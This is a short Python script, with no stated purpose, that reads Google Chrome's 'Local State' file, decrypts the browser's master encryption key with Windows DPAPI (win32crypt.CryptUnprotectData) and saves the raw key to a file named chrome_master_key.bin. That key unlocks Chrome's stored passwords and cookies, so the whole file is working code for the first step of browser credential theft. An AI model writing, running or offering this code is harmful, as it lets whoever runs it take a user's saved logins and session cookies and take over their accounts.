import os
import json
import base64
import win32crypt

def extract_key():
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    output_path = os.path.join(os.getcwd(), "chrome_master_key.bin")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    with open(output_path, "wb") as f:
        f.write(key)

if __name__ == "__main__":
    extract_key()
